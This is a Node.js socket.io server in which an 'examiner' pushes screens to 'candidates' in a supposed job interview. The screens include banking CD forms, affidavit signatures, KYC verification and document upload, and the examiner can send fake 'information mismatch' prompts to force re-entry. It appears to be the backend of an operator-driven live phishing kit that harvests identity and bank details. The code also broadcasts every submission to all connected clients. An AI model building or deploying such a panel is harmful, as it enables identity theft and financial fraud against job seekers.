const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(path.join(__dirname, 'public')));
app.use('/screens', express.static(path.join(__dirname, 'screens')));

/**
 * POINT 6: PERSISTENCE LAYER
 */
let globalSessionStore = {
    candidates: {}, // Format: { socketId: { name, category, transcript: [], lastScreen: {} } }
};

/**
 * SCREEN DATABASE REFACTOR (Points 3 & 5)
 */
const screenDatabase = [
    { name: "Welcome Screen", file: "welcome.html", category: "general", isDefault: true },
    { name: "Personal Bio Form", file: "bio.html", category: "general" },
    { name: "Document Upload", file: "upload.html", category: "general" },
    
    { name: "Specialty CD Form", file: "cd_form.html", category: "banking", isDefault: true },
    { name: "Affidavit Signature", file: "affidavit.html", category: "banking" },
    { name: "KYC Verification", file: "kyc.html", category: "banking" },
    
    { name: "Data Analysis Task", file: "analysis.html", category: "data", isDefault: true },
    { name: "System Logic Test", file: "logic.html", category: "data" }
];

io.on('connection', (socket) => {

    // On Examiner refresh, send existing candidates and their histories
    socket.emit('sync_sessions', globalSessionStore.candidates);

    socket.on('join_interview', (data) => {
        const { name, category } = data;
        
        // Find default screen for this specific category
        const defaultScreen = screenDatabase.find(s => s.category === category && s.isDefault);
        
        // Initialize or update persistence for this user
        globalSessionStore.candidates[socket.id] = {
            id: socket.id,
            name: name,
            category: category,
            transcript: [],
            lastScreen: null
        };

        // Notify examiner that a new candidate is ready
        io.emit('candidate_online', globalSessionStore.candidates[socket.id]);

        if (defaultScreen) {
            const payload = { 
                header: "Official Documentation", 
                subHeader: "Please fill out the required fields below.",
                screenFile: defaultScreen.file // Matches the fetch() call in index.html
            };
            globalSessionStore.candidates[socket.id].lastScreen = payload;
            socket.emit('new_task', payload);
        }
    });

    /**
     * POINT 2 & 3: SCREEN TRIGGER
     */
    socket.on('trigger_screen', (data) => {
        // Find the screen by file name or name depending on examiner.html mapping
        const screenInfo = screenDatabase.find(s => s.file === data.screenFile || s.name === data.screenName);
        
        if (screenInfo && globalSessionStore.candidates[data.candidateId]) {
            const payload = { 
                screenFile: screenInfo.file,
                header: data.header || data.customHeader || screenInfo.name,
                subHeader: data.subHeader || data.customSubHeader || "Please provide accurate information."
            };
            
            globalSessionStore.candidates[data.candidateId].lastScreen = payload;
            io.to(data.candidateId).emit('new_task', payload);
        }
    });

    /**
     * POINT 1: WRONG ANSWER REFACTOR
     */
    socket.on('mark_wrong', (data) => {
        io.to(data.candidateId).emit('wrong_answer', { 
            message: data.message || "Information mismatch detected. Please review and re-enter details." 
        });
    });

    socket.on('task_submitted', (data) => {
        if (globalSessionStore.candidates[socket.id]) {
            globalSessionStore.candidates[socket.id].transcript.push({
                task: data.screenFile,
                answer: data.answer,
                timestamp: new Date().toLocaleTimeString()
            });
        }
        // Notify examiner of the submission
        io.emit('notify_submission', data); 
    });

    socket.on('typing', (data) => {
        io.emit('is_typing', data.name);
    });

    socket.on('disconnect', () => {
        // Keep in store so examiner doesn't lose the transcript immediately
        console.log(`User ${socket.id} disconnected. Session preserved.`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Modular Bank Server Live on ${PORT}`);
});